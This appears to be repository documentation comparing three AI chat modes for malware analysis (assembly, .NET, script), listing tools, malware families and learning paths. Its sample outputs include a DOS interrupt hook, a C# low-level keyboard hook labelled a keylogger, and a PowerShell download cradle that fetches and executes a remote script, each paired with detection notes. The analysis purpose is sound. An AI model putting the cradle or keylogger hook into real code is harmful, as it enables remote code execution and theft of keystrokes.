# Expert Malware Analysis Modes - Detailed Comparison

This document provides a detailed comparison of the three expert-level malware analysis chat modes available in this repository.

## 📊 Overview

| Aspect | ASM Expert | .NET Expert | Script Expert |
|--------|-----------|-------------|---------------|
| **Primary Focus** | Native binaries | Managed code | Interpreted scripts |
| **Languages** | x86/x64/ARM assembly | C#, VB.NET, F# | BAT, VBS, PS1, JS |
| **Era** | 1980s-2000s (legacy) | 2000s-present | 1990s-present |
| **Complexity** | Very High | High | Medium-High |
| **Tools Needed** | Disassembler, debugger | Decompiler (dnSpy) | Text editor, decoder |

---

## 🔬 analyze-malware-asm-expert

### When to Use
- Analyzing DOS viruses and boot sector malware
- Reverse engineering native Windows/Linux executables
- Studying polymorphic and metamorphic engines
- Deep-dive into x86/x64 instruction sets
- Legacy malware from pre-.NET era

### Expertise Areas
- **Assembly Languages**: x86, x64, ARM, MIPS
- **System Calls**: INT 21h (DOS), syscall (Linux), Windows API
- **Memory Management**: Segments, selectors, page tables
- **File Formats**: COM, EXE (DOS), PE, ELF
- **Reverse Engineering**: IDA Pro, Ghidra, radare2

### Example Malware Families
- CIH/Chernobyl
- Michelangelo
- Brain (first PC virus)
- Cascade
- Jerusalem
- Code Red (with native payloads)

### Sample Analysis Output
```
### Infection Mechanism

The virus modifies the INT 21h interrupt vector to intercept file operations...

```asm
infection_routine:
    mov     ax, 3521h       ; Get INT 21h vector
    int     21h             ; DOS interrupt
    mov     [old_int21], bx ; Save old handler
    mov     [old_int21+2], es
    
    mov     dx, OFFSET new_int21
    mov     ax, 2521h       ; Set new INT 21h vector
    int     21h
```

**MITRE ATT&CK:** T1055 - Process Injection (via interrupt hooking)
```

---

## 🔵 analyze-malware-dotnet-expert

### When to Use
- Analyzing .NET executables and DLLs
- Reverse engineering obfuscated managed code
- Studying modern RATs and info stealers
- Investigating C# ransomware
- Analyzing .NET-based APT tools

### Expertise Areas
- **Languages**: C#, VB.NET, F#, IL/MSIL
- **Frameworks**: .NET Framework 2.0-4.8, .NET Core, .NET 5+
- **Decompilation**: dnSpy, ILSpy, dotPeek, JustDecompile
- **Obfuscators**: ConfuserEx, .NET Reactor, Eazfuscator, SmartAssembly
- **Concepts**: Reflection, P/Invoke, dynamic loading, async/await

### Example Malware Families
- **Agent Tesla** - Keylogger and info stealer
- **AsyncRAT** - Remote access trojan
- **NanoCore RAT** - Commercial RAT
- **NetWire** - Keylogger
- **Snake Keylogger** - Credential stealer
- **Formbook** - Data stealer (sometimes uses .NET loaders)
- **Cerber** - Ransomware (some variants)

### Sample Analysis Output
```csharp
### Keylogging Implementation

The malware uses SetWindowsHookEx via P/Invoke to capture keystrokes...

```csharp
[DllImport("user32.dll")]
private static extern IntPtr SetWindowsHookEx(
    int idHook,
    KeyboardHookDelegate lpfn,
    IntPtr hMod,
    uint dwThreadId
);

private delegate IntPtr KeyboardHookDelegate(
    int nCode, IntPtr wParam, IntPtr lParam
);

public void InstallKeylogger()
{
    // WH_KEYBOARD_LL = 13 (low-level keyboard hook)
    _hookHandle = SetWindowsHookEx(13, KeyboardProc, 
        GetModuleHandle(null), 0);
}

// Detection: Monitor P/Invoke calls to SetWindowsHookEx
// MITRE ATT&CK: T1056.001 - Input Capture: Keylogging
```

---

## 📜 analyze-malware-script-expert

### When to Use
- Analyzing PowerShell-based malware
- Reverse engineering VBScript worms
- Studying macro-based malware
- Investigating JavaScript downloaders
- Analyzing multi-stage script attacks

### Expertise Areas
- **Languages**: Batch, VBScript, PowerShell, JavaScript, HTA, WSF
- **Execution Contexts**: cmd.exe, wscript.exe, powershell.exe, mshta.exe
- **Obfuscation**: Base64, hex encoding, string concatenation
- **APIs**: COM objects, WMI, .NET from PowerShell
- **Techniques**: Living-off-the-Land, fileless execution

### Example Malware Families
- **Emotet** - PowerShell downloaders
- **TrickBot** - PowerShell components
- **Cobalt Strike** - PowerShell payloads
- **Empire** - PowerShell post-exploitation
- **ILOVEYOU** - VBScript worm
- **Melissa** - VBA macro virus

### Sample Analysis Output
```powershell
### Download Cradle Analysis

The malware uses multiple PowerShell techniques to download and execute payload...

```powershell
# Obfuscated download cradle (deobfuscated for clarity)
$url = "http://<redacted>/stage2.ps1"

# Method 1: WebClient DownloadString
$client = New-Object System.Net.WebClient
$code = $client.DownloadString($url)
Invoke-Expression $code  # IEX - executes downloaded code

# Method 2: Invoke-WebRequest (PS 3.0+)
IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# Detection opportunities:
# 1. Monitor New-Object System.Net.WebClient
# 2. Alert on Invoke-Expression with network-sourced data
# 3. Track Invoke-WebRequest followed by IEX
# 4. Log PowerShell ScriptBlock execution

# MITRE ATT&CK: T1059.001 - PowerShell
# MITRE ATT&CK: T1105 - Ingress Tool Transfer
```

---

## 🎯 Selection Decision Tree

```
Start: What type of malware do you have?

├─ Is it a compiled binary?
│  ├─ Yes: Does it import "mscoree.dll"?
│  │  ├─ Yes: .NET executable → use dotnet-expert
│  │  └─ No: Native binary
│  │     ├─ Modern (PE32+) → use asm-expert
│  │     └─ Legacy (COM/DOS) → use asm-expert
│  └─ No: Is it source code or script?
│     ├─ Assembly (.asm, .s) → use asm-expert
│     ├─ C#/VB.NET (.cs, .vb) → use dotnet-expert
│     └─ Script (.bat, .vbs, .ps1, .js) → use script-expert
```

---

## 🔧 Tool Requirements by Mode

### ASM Expert Mode
**Static Analysis:**
- IDA Pro / Ghidra / radare2
- PE/ELF parsers (PEview, readelf)
- Hex editors (HxD, 010 Editor)

**Dynamic Analysis:**
- x64dbg / OllyDbg / WinDbg
- DOSBox (for DOS malware)
- Debugging symbols (if available)

---

### .NET Expert Mode
**Static Analysis:**
- dnSpy (recommended - debugging + decompilation)
- ILSpy (open-source decompiler)
- dotPeek (JetBrains)
- de4dot (deobfuscator)
- PEiD (.NET detector)

**Dynamic Analysis:**
- dnSpy (live debugging)
- Process Hacker (CLR monitoring)
- Procmon (Sysinternals)
- .NET Reflector (commercial)

**Deobfuscation:**
- de4dot (automated)
- NoFuserEx (ConfuserEx unpacker)
- Manual IL patching in dnSpy

---

### Script Expert Mode
**Static Analysis:**
- Any text editor (VSCode, Notepad++)
- CyberChef (deobfuscation)
- PowerDecode (PowerShell deobfuscator)
- Base64 decoders

**Dynamic Analysis:**
- PowerShell ISE (safe execution)
- Process Monitor (script activity)
- Wireshark (network traffic)
- Sandbox environments

**Deobfuscation:**
- Manual replacement of encoded strings
- CyberChef recipes
- Custom Python/PowerShell scripts
- PSDecode (PowerShell decoder)

---

## 📈 Complexity and Time Investment

| Mode | Setup Complexity | Analysis Time | Learning Curve | Tool Cost |
|------|-----------------|---------------|----------------|-----------|
| **ASM Expert** | High (debuggers, VMs) | Hours-Days | Very Steep | $0-$$$$ |
| **.NET Expert** | Medium (dnSpy) | Hours | Moderate | $0-$$$ |
| **Script Expert** | Low (text editor) | Minutes-Hours | Low | Free |

---

## 🎓 Recommended Learning Path

### For Beginners
1. **Start with**: script-expert (easier to read)
2. **Then try**: dotnet-expert (structured, high-level)
3. **Finally master**: asm-expert (most complex)

### For Experienced Analysts
- Choose based on sample type
- Master all three for complete coverage
- Understand how they complement each other

---

## 🌐 Real-World Scenarios

### Scenario 1: APT Campaign
**Discovery:** Phishing email with .docm attachment

**Analysis Path:**
1. **script-expert**: Analyze VBA macro in document
2. **dotnet-expert**: Examine dropped .NET loader
3. **asm-expert**: Reverse final native payload

### Scenario 2: Ransomware Attack
**Discovery:** Encrypted files on network

**Analysis Path:**
1. **dotnet-expert**: Analyze C# ransomware executable
2. **script-expert**: Examine PowerShell distribution scripts
3. **Network analysis**: C2 communication protocols

### Scenario 3: Legacy System Infection
**Discovery:** DOS-based industrial control system compromised

**Analysis Path:**
1. **asm-expert**: Analyze COM file infector
2. **asm-expert**: Reverse boot sector modifications
3. **Document findings** for system recovery

---

## 💡 Pro Tips

### Cross-Mode Analysis
- Many modern attacks use multiple layers
- Example: PowerShell → .NET loader → Native shellcode
- Use multiple modes in sequence for complete picture

### Obfuscation Levels
- **Scripts**: Often heavily obfuscated but easily decoded
- **.NET**: Obfuscated with tools but decompilable
- **Native**: Hardest to reverse, may use packers/crypters

### Detection Focus
- **Scripts**: Command-line arguments, encoded strings
- **.NET**: Assembly metadata, P/Invoke patterns
- **Native**: API call sequences, memory patterns

---

## 📚 Additional Resources

### For ASM Expert
- Intel® 64 and IA-32 Architectures Software Developer Manuals
- "The Art of Assembly Language" by Randall Hyde
- "Practical Malware Analysis" by Michael Sikorski

### For .NET Expert
- ECMA-335 (Common Language Infrastructure)
- Microsoft .NET documentation
- "Practical .NET Malware Analysis" resources

### For Script Expert
- PowerShell documentation (Microsoft)
- VBScript reference (archived)
- "PowerShell for Sysadmins" (to understand abuse)

---

## 🎯 Summary

Choose your chat mode based on:
1. **File type** of the malware
2. **Your analysis goals** (quick triage vs deep dive)
3. **Available tools** and environment
4. **Your expertise level**

All three expert modes produce **publication-grade** analysis (2500-4000 words) suitable for:
- Security research papers
- Incident response reports
- Threat intelligence sharing
- Training materials
- Conference presentations

---

**Last Updated:** November 16, 2025
**Maintained by:** petikvx malware analysis team
